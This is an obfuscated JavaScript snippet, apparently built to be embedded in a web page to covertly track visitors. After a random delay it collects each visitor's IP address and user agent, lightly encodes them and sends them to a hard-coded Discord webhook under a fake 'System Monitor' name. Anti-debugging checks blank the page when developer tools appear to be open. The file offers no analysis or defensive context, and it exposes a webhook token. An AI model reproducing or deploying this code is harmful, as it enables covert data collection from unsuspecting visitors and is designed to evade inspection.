(function() {
    // Obfuscated anti-debug
    const _0x4f2a = (t = performance.now()) => {
        const a = new Error().stack;
        const n = performance.now() - t;
        return !!(n > 100 || /\b(Chrome|Firebug)\b/.test(a));
    };

    const _0x2b1c = btoa(String.fromCharCode(
        ...crypto.getRandomValues(new Uint8Array(32))
    ));

    const _0x1a3d = async () => {
        try {
            const endpoints = [
                'https://api64.ipify.org?format=json',
                'https://api.ipdata.co?api-key=test',
                'https://ipapi.co/json/'
            ];

            let data;
            for (const url of endpoints) {
                try {
                    const res = await fetch(url);
                    data = await res.json();
                    if (data.ip) break;
                } catch(e) {
                    continue;
                }
            }

            if (!data?.ip) return;

            const info = {
                ip: data.ip,
                ua: navigator.userAgent,
                ts: Date.now(),
                id: _0x2b1c
            };

            const encrypted = btoa(JSON.stringify(info))
                .split('').reverse().join('')
                .replace(/=/g, '')
                + Math.random().toString(36).slice(2);

            await fetch('https://discord.com/api/webhooks/1317108564736737382/oxsbS03XDSYsKHyNKFSbgaC90hUY3luNIz-q3BPBDDZ6zVXkagBVEqcBAynL1kqGbPEH', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    content: encrypted,
                    username: 'System Monitor ' + Math.random().toString(36).slice(2)
                })
            });
        } catch(e) {
            console.clear();
        }
    };

    // Multiple layers of protection
    const _0x3c4d = () => {
        if (_0x4f2a() || 
            window.outerWidth - window.innerWidth > 150 || 
            window.outerHeight - window.innerHeight > 150 ||
            window.Firebug || 
            window.console.profiles.length > 0) {
            document.body.innerHTML = '';
            window.location.replace('about:blank');
        }
    };

    // Random intervals
    const intervals = [970, 1130, 1230, 1450].map(i => 
        setInterval(_0x3c4d, i + Math.random() * 200)
    );

    // Delayed tracking
    setTimeout(_0x1a3d, 2000 + Math.random() * 3000);

    // Additional protection layers
    (() => {
        const _0x5e2f = Object.defineProperty;
        _0x5e2f(window, 'console', {
            get: () => {
                _0x3c4d();
                return console;
            }
        });
    })();
})();
